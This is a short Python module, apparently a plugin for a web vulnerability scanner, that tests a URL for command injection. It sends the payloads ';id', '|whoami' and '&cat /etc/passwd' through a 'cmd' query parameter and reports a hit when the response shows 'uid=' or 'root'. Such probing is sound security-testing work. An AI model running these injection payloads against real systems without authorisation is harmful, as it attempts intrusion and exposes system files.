import aiohttp

async def scan(url, config):
    print(f"[CMD Injection] Scanning {url}")
    payloads = [";id", "|whoami", "&cat /etc/passwd"]
    async with aiohttp.ClientSession() as session:
        for p in payloads:
            test_url = f"{url}?cmd={p}"
            try:
                async with session.get(test_url, timeout=config['timeout']) as resp:
                    text = await resp.text()
                    if "uid=" in text or "root" in text:
                        print(f"[CRITICAL] Command Injection at {test_url}")
            except Exception:
                continue
